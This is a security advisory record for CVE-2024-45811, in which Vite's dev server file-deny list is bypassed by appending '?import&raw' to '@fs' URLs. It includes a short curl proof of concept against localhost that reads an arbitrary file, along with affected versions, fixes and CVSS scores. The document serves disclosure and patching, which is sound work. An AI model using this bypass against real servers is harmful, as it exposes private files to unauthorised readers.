advisory_id: GHSA-9cwx-2883-4wfx
datasource_id: github_osv_importer_v2/GHSA-9cwx-2883-4wfx
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9cwx-2883-4wfx/GHSA-9cwx-2883-4wfx.json
aliases:
  - CVE-2024-45811
summary: |
  Vite's `server.fs.deny` is bypassed when using `?import&raw`
  ### Summary
  The contents of arbitrary files can be returned to the browser.

  ### Details
  `@fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.

  ### PoC
  ```sh
  $ npm create vite@latest
  $ cd vite-project/
  $ npm install
  $ npm run dev

  $ echo "top secret content" > /tmp/secret.txt

  # expected behaviour
  $ curl "http://localhost:5173/@fs/tmp/secret.txt"

      <body>
        <h1>403 Restricted</h1>
        <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.

  # security bypassed
  $ curl "http://localhost:5173/@fs/tmp/secret.txt?import&raw"
  export default "top secret content\n"
  //# sourceMappingURL=data:application/json;base64,eyJ2...
  ```
impacted_packages:
  - purl: pkg:npm/vite
    affected_versions: vers:npm/<=5.3.5
    fixed_versions: vers:npm/5.3.6
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/<=5.4.5
    fixed_versions: vers:npm/5.4.6
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/>=5.2.0|<5.2.14
    fixed_versions: vers:npm/5.2.14
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/<=4.5.3
    fixed_versions: vers:npm/4.5.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/<=3.2.10
    fixed_versions: vers:npm/3.2.11
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite
    affected_versions: vers:npm/<=5.1.7
    fixed_versions: vers:npm/5.1.8
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9cwx-2883-4wfx/GHSA-9cwx-2883-4wfx.json
  - score: '6.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9cwx-2883-4wfx/GHSA-9cwx-2883-4wfx.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-200
  - CWE-284
references:
  - url: https://github.com/vitejs/vite
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7
    reference_type:
    reference_id:
  - url: https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-45811
    reference_type:
    reference_id: CVE-2024-45811
